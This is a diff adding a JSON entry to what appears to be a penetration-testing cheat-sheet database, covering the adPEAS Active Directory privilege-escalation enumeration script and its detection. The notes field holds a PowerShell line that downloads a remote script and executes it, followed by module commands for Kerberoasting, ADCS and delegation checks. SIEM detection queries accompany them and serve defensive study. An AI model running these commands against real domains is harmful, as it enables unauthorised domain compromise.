@@ -1,0 +1,88 @@
+{
+  "id": "ad-adpeas",
+  "name": "adPEAS - AD Privilege Escalation Awesome Script",
+  "command": "Import-Module .\\adPEAS.ps1; Invoke-adPEAS",
+  "description": "adPEAS automates Active Directory enumeration for privilege escalation. It checks for Kerberoastable/AS-REP roastable accounts, ADCS misconfigurations (ESC1-ESC8), delegation abuse, GPO weaknesses, LAPS, gMSA, credential exposure, and more. Think of it as linPEAS but specifically for AD domain escalation paths.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "Enumeration",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "61106960/adPEAS; CRTP enumeration",
+  "tags": [
+    "adpeas",
+    "ad-enumeration",
+    "privilege-escalation",
+    "adcs",
+    "delegation",
+    "automated-enum"
+  ],
+  "mitre": [
+    "T1087.002"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== DOWNLOAD & RUN ===\n  # Download\n  iex(New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1\")\n  # Or from disk:\n  Import-Module .\\adPEAS.ps1\n  Invoke-adPEAS\n\n=== SPECIFIC MODULES ===\n  Invoke-adPEAS -Module Domain       # Domain info\n  Invoke-adPEAS -Module Creds        # Credential exposure\n  Invoke-adPEAS -Module Delegation   # Delegation abuse\n  Invoke-adPEAS -Module Accounts     # Kerberoast/ASREP\n  Invoke-adPEAS -Module Computer     # LAPS, gMSA, RBCD\n  Invoke-adPEAS -Module ADCS         # Certificate services\n  Invoke-adPEAS -Module BloodHound   # BH collection\n\n=== WHAT IT CHECKS ===\n- Kerberoastable accounts (SPNs)\n- AS-REP roastable accounts\n- Unconstrained/constrained/RBCD delegation\n- ADCS ESC1-ESC8 vulnerabilities\n- LAPS configuration\n- gMSA password access\n- GPO abuse paths\n- Credential in description fields\n- AdminSDHolder persistence\n- Trust relationships",
+  "examples": [
+    {
+      "label": "Run full AD enumeration",
+      "command": "Import-Module .\\adPEAS.ps1; Invoke-adPEAS"
+    },
+    {
+      "label": "Check ADCS only",
+      "command": "Invoke-adPEAS -Module ADCS"
+    },
+    {
+      "label": "Check delegation abuse",
+      "command": "Invoke-adPEAS -Module Delegation"
+    }
+  ],
+  "references": [
+    {
+      "title": "adPEAS - GitHub",
+      "url": "https://github.com/61106960/adPEAS"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-sharpview",
+      "note": "SharpView for manual enumeration; adPEAS automates the common checks.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "adPEAS uses standard LDAP queries and PowerShell AD modules to enumerate privilege escalation paths. All checks use legitimate AD query interfaces that domain users have access to by default.",
+    "prerequisites": "Domain user credentials; PowerShell execution on a domain-joined machine.",
+    "impact": "Reveals all common AD privilege escalation paths in one run; accelerates domain compromise.",
+    "detection": "[MITRE T1087.002] High volume of LDAP queries from a single source; PowerShell script block logging showing adPEAS module.",
+    "artifacts": "PowerShell script block logs (4104) with adPEAS functions; LDAP query volume spike; Sysmon pipe/network events.",
+    "splunk_spl": "index=windows EventCode=4104 ScriptBlockText=\"*adPEAS*\"\n| table _time, ComputerName, UserName, ScriptBlockText",
+    "elastic_kql": "event.code:\"4104\" AND powershell.file.script_block_text:*adPEAS*",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4104\n| where CommandLine has \"adPEAS\"\n| project TimeGenerated, Computer, Account, CommandLine",
+    "sigma_rules": "posh_ps_adpeas_execution",
+    "prevention": "PowerShell Constrained Language Mode; script block logging; AMSI; restrict unnecessary LDAP query permissions.",
+    "sources": [
+      "CRTP methodology",
+      "https://attack.mitre.org/techniques/T1087/002/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "adPEAS AD enumeration script execution",
+        "logic": "DeviceEvents\n| where ActionType == \"PowerShellCommand\"\n| where AdditionalFields has \"adPEAS\" or AdditionalFields has \"Invoke-adPEAS\"\n| project Timestamp, DeviceName, AccountName, AdditionalFields",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1087.002"
+        ],
+        "fidelity": "signature",
+        "confidence": "high",
+        "false_positives": "Authorized security assessments; internal red team exercises",
+        "tuning": "Alert on any detection; whitelist only during authorized assessments"
+      }
+    ]
+  }
+}
